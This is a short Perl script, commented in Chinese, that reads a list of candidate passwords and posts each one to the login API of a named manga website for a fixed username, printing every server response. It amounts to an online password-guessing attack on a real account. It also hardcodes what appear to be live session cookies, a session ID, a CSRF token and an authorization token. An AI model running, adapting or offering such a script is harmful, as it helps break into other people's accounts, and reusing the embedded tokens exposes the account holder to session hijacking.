use strict;
use warnings;
use MIME::Base64;
use LWP::UserAgent;

# 构造请求头
my $url = 'https://relamanhua.com/api/v1/login';
my $cookie = 'uncer=ac738b1c-c571-11ed-abac-024352452ce0; webp=1; _ga=GA1.2.262756585.1679132759; _gid=GA1.2.713600815.1679132759; age=18; name=_operate; user_id=3e0b2694-0576-11ed-9801-02ccfc3df1dc; avatar="user/cover/ava.png"; create="2022-07-17 02:14:52.438350+00:00"; comic_vip=0; cartoon_vip=0; email=""; token=de90e172243d310a92b38f7caf6300a185164ea9; csrftoken=xiRflFtdhW9zp719nvMFtLxdFA6C1wmA; sessionid=mrocc0sp0k3mqy5t56a3bdkn00z0xuh1';
my $auth_token = 'Token de90e172243d310a92b38f7caf6300a185164ea9';
my %headers = (
    'Cookie' => $cookie,
    'Authorization' => $auth_token,
    'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept' => 'application/json, text/plain, */*',
    'Platform' => '2',
    'Referer' => 'https://relamanhua.com/web/login/loginByAccount',
    'Origin' => 'https://relamanhua.com',
    'Sec-Fetch-Site' => 'same-origin',
    'Sec-Fetch-Mode' => 'cors',
    'Sec-Fetch-Dest' => 'empty',
    'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36',
);

# 构造请求参数
my $username = '_operate';
my $salt = '208201';
my $platform = '2';
my $version = '2022.08.14';
my $source = '';

foreach my $password (<>) {
    my $encoded = encode_base64($password);
    my $params = "username=$username&password=$password&salt=$salt&platform=$platform&version=$version&source=$source";
    my $ua = LWP::UserAgent->new;
    my $response = $ua->post($url, %headers, Content => $params);

    # 输出响应结果
    if ($response->is_success) {
        print $response->decoded_content;
    }
    else {
        print $response->status_line;
    }
}


